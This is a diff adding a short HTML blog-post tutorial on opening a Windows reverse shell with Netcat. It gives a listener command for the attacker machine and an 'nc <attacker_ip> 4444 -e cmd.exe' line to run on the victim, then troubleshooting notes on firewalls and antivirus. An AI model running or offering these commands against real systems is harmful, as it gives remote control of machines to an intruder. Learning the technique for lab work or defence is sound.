@@ -1,0 +1,15 @@
+<p>Netcat is a networking tool that can be used to create reverse shells, transfer files, and more. In this post, we'll look at how to create a reverse shell (from Windows to Windows) using Netcat.</p>
+<img src="https://via.placeholder.com/600x300" alt="Netcat Example" class="img-fluid mb-3">
+
+<p>First we need to set up the listener on the attacker machine:</p>
+<pre><code>nc -lvp 4444</code></pre>
+
+<p>Next, we need to connect to the listener from the victim machine:</p>
+<pre><code>nc &lt;attacker_ip&gt; 4444 -e cmd.exe</code></pre>
+
+<p>After running the above command on the victim machine, you should see a new shell open on the attacker machine.</p>
+<h3>Possible Issues:</h3>
+<ul>
+    <li>Firewall blocking the connection, the attacker machine should allow incoming connections on the specified port.</li>
+    <li>Antivirus detecting the connection, a reverse shell is a common technique used by attackers and therefore its likely to be detected easily.</li>
+</ul>
